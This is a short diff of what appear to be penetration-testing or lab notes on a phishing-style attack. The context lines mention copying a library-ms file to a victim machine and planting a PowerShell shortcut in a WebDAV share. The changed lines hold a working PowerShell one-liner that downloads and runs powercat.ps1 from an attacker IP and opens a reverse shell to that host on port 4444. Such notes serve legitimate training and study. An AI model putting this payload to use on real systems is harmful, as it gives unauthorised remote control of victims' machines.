@@ -39,6 +39,6 @@ copy library ms file to victim machine
 create shortcut with powershell and place in webdav directory
 
 ```
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.217:9090/powercat.ps1');
-powercat -c 192.168.45.217 -p 4444 -e powershell"
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.158:8000/powercat.ps1');
+powercat -c 192.168.45.158 -p 4444 -e powershell"
 ```
